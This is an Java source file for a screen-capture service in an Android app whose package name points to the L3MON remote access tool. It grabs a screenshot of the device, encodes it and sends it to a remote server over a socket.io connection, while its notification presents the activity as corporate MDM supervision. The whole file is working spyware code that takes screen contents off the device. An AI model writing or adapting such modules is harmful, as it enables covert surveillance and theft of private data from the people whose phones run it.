package com.etechd.l3mon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {

    private static final String CHANNEL_ID = "mdm_screen_capture";
    private static final int NOTIFICATION_ID = 9001;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        int resultCode = intent.getIntExtra("RESULT_CODE", -1);
        Intent resultData = intent.getParcelableExtra("RESULT_DATA");

        if (resultCode == -1 || resultData == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        captureScreen(resultCode, resultData);
        return START_NOT_STICKY;
    }

    private void captureScreen(int resultCode, Intent resultData) {
        MediaProjectionManager manager =
            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        if (manager == null) { stopSelf(); return; }

        mediaProjection = manager.getMediaProjection(resultCode, resultData);
        if (mediaProjection == null) { stopSelf(); return; }

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "MDMCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null, null
        );

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        Bitmap bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride, height,
                            Bitmap.Config.ARGB_8888
                        );
                        bitmap.copyPixelsFromBuffer(buffer);
                        image.close();

                        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                        String base64Image = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

                        sendToServer(base64Image);

                        bitmap.recycle();
                        croppedBitmap.recycle();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    cleanup();
                }
            }
        }, 500); 
    }

    private void sendToServer(String base64Image) {
        try {
            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
            if (socket != null && socket.connected()) {
                JSONObject payload = new JSONObject();
                payload.put("type", "0xSC");
                payload.put("imageBase64", base64Image);
                payload.put("timestamp", System.currentTimeMillis());
                socket.emit("data", payload);
                android.util.Log.d("MDMCapture", "Screenshot sent to server. Size: " + base64Image.length() + " chars");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void cleanup() {
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
        if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }
        stopSelf();
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Supervisión Corporativa",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Captura de pantalla corporativa activa");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setContentTitle("Supervisión MDM Activa")
            .setContentText("Captura de pantalla corporativa en progreso...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(Notification.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        cleanup();
    }
}
